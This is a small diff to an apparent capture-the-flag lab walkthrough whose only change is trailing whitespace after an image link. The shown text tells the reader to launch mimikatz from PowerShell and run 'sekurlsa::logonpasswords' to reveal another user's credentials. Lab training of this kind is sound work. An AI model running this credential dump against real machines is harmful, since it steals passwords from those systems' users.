@@ -120,7 +120,7 @@ Start up the **Machine** attached to this task.
 Qn1. Open up Powershell on the Machine, and go to the mimikatz folder:  
 `cd C:\Users\Administrator\Desktop\mimikatz\x64`  
 `.\mimikatz.exe`  
-![](./res/answer1.png)
+![](./res/answer1.png)  
 Run the following commands to find the username of the other user on the system:  
 `sekurlsa::logonpasswords`  
 ![](./res/answer2.png)
